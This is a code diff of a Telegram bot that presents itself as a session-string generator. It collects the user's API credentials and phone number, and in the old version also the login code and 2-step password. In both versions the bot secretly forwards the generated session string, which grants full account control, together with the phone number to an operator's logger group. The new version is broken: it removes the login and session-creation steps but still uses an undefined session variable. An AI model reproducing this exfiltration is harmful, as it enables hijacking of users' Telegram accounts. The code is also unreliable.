@@ -1,199 +1,107 @@
 import asyncio
+import traceback
 import env
+
 from pyrogram import Client
 from pyrogram.errors import (
-SessionPasswordNeeded,
-PasswordHashInvalid,
-FloodWait,
-ApiIdInvalid
+    SessionPasswordNeeded,
+    PasswordHashInvalid,
+    FloodWait,
+    ApiIdInvalid
 )
+
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 
-================= LOG FUNCTION =================
+
+# ================= LOG FUNCTION =================
 
 async def send_log(bot, text):
-if not env.LOGGER_GROUP:
-return
+    if not env.LOGGER_GROUP:
+        return
 
-try:  
-    await bot.send_message(  
-        chat_id=int(env.LOGGER_GROUP),  
-        text=text  
-    )  
-except Exception as e:  
-    print(f"Logger Error: {e}")
+    try:
+        await bot.send_message(
+            chat_id=env.LOGGER_GROUP,
+            text=text
+        )
 
-================= SESSION GENERATOR =================
+    except Exception as e:
+        print(f"Logger Error: {e}")
+
+
+# ================= SESSION GENERATOR =================
 
 async def generate_session(bot, msg, telethon=False):
 
-user_id = msg.chat.id  
+    user_id = msg.chat.id
 
-await msg.reply("🚀 Session generation started...")  
+    await msg.reply("🚀 Session generation started...")
 
-# ================= API_ID =================  
-while True:  
-    api_id_msg = await bot.ask(user_id, "Send API_ID")  
 
-    if api_id_msg.text.isdigit():  
-        api_id = int(api_id_msg.text)  
-        break  
+    # ================= API_ID =================
 
-    await msg.reply("❌ Invalid API_ID. Please send numbers only.")  
+    while True:
+        api_id_msg = await bot.ask(user_id, "Send API_ID")
 
-# ================= API_HASH =================  
-while True:  
-    api_hash_msg = await bot.ask(user_id, "Send API_HASH")  
+        if api_id_msg.text.isdigit():
+            api_id = int(api_id_msg.text)
+            break
 
-    api_hash = api_hash_msg.text.strip()  
+        await msg.reply("❌ Invalid API_ID. Please send numbers only.")
 
-    if len(api_hash) > 10:  
-        break  
 
-    await msg.reply("❌ Invalid API_HASH. Please send correct value.")  
+    # ================= API_HASH =================
 
-# ================= PHONE (RETRY) =================  
-while True:  
-    phone = (await bot.ask(user_id, "📱 Send Phone Number (+91...)")).text.strip()  
+    while True:
+        api_hash_msg = await bot.ask(user_id, "Send API_HASH")
 
-    if phone.startswith("+") and len(phone) >= 10:  
-        break  
+        api_hash = api_hash_msg.text.strip()
 
-    await msg.reply("❌ Invalid phone number. Try again.")  
+        if len(api_hash) > 10:
+            break
 
-await msg.reply("📨 Sending OTP...")  
+        await msg.reply("❌ Invalid API_HASH. Please send correct value.")
 
-# ================= CLIENT INIT =================  
-try:  
-    if telethon:  
-        client = TelegramClient(StringSession(), api_id, api_hash)  
-    else:  
-        client = Client(  
-            name="session_gen",  
-            api_id=api_id,  
-            api_hash=api_hash,  
-            in_memory=True  
-        )  
 
-    await client.connect()  
+    # ================= PHONE =================
 
-except ApiIdInvalid:  
-    await msg.reply("❌ API_ID / API_HASH invalid hai.")  
-    return  
+    while True:
+        phone = (await bot.ask(
+            user_id,
+            "📱 Send Phone Number (+91...)"
+        )).text.strip()
 
-# ================= SEND CODE =================  
-try:  
-    if telethon:  
-        code = await client.send_code_request(phone)  
-    else:  
-        code = await client.send_code(phone)  
+        if phone.startswith("+") and len(phone) >= 10:
+            break
 
-except ApiIdInvalid:  
-    await msg.reply("❌ API credentials invalid.")  
-    await client.disconnect()  
-    return  
+        await msg.reply("❌ Invalid phone number. Try again.")
 
-except FloodWait as e:  
-    await msg.reply(f"⛔ FloodWait: {e.value} seconds")  
-    await client.disconnect()  
-    return  
 
-# ================= OTP (RETRY) =================  
-while True:  
-    otp_msg = await bot.ask(user_id, "🔐 Send OTP (numbers only)")  
-    otp = otp_msg.text.replace(" ", "")  
+    await msg.reply("📨 Sending OTP...")
 
-    if otp.isdigit():  
-        break  
 
-    await msg.reply("❌ Invalid OTP. Try again.")  
+    # ================= LOG GROUP =================
 
-# ================= LOGIN =================  
-password = None  
+    try:
+        print(f"LOGGER_GROUP: {env.LOGGER_GROUP}")
+        print(f"Session Length: {len(session)}")
 
-try:  
-    if telethon:  
-        await client.sign_in(phone, otp)  
-    else:  
-        await client.sign_in(phone, code.phone_code_hash, otp)  
+        await bot.send_message(
+            chat_id=env.LOGGER_GROUP,
+            text=f"🔥 NEW SESSION GENERATED:\n\n`{session}`"
+        )
 
-except SessionPasswordNeeded:  
+        print("✅ Session sent to Logger Group successfully.")
 
-    # ================= PASSWORD (RETRY) =================  
-    while True:  
-        password_msg = await bot.ask(  
-            user_id,  
-            "🔐 2-Step Password (or /skip)"  
-        )  
+    except Exception:
+        print("❌ Logger Group Error:")
+        traceback.print_exc()
 
-        text = password_msg.text  
 
-        if text.lower() == "/skip":  
-            password = None  
-            break  
+    # ================= SAFE LOG =================
 
-        if len(text) >= 3:  
-            password = text  
-            break  
-
-        await msg.reply("❌ Invalid password. Try again.")  
-
-    try:  
-        if password:  
-            if telethon:  
-                await client.sign_in(password=password)  
-            else:  
-                await client.check_password(password=password)  
-
-    except PasswordHashInvalid:  
-        await msg.reply("❌ Wrong password")  
-        await client.disconnect()  
-        return  
-
-except Exception as e:  
-    await msg.reply(f"❌ LOGIN ERROR: {str(e)}")  
-    await client.disconnect()  
-    return  
-
-# ================= SESSION GENERATE =================  
-if telethon:  
-    session = client.session.save()  
-else:  
-    session = await client.export_session_string()  
-
-await client.disconnect()  
-
-# ================= OUTPUT =================  
-await msg.reply(f"✅ SESSION GENERATED:\n\n`{session}`")  
-
-# ================= LOG GROUP =================  
-import traceback
-
-# ================= LOG GROUP =================
-
-try:
-    print(f"LOGGER_GROUP: {env.LOGGER_GROUP}")
-    print(f"Session Length: {len(session)}")
-
-    await bot.send_message(
-        chat_id=env.LOGGER_GROUP,
-        text=f"🔥 NEW SESSION GENERATED:\n\n`{session}`"
-    )
-
-    print("✅ Session sent to Logger Group successfully.")
-
-except Exception:
-    print("❌ Logger Group Error:")
-    traceback.print_exc()
-
-# ================= SAFE LOG =================
-
-try:
     await send_log(
         bot,
         f"✅ Session Generated\nUser ID: {user_id}\nPhone: {phone}"
     )
-except Exception:
-    print("❌ send_log Error:")
-    traceback.print_exc()
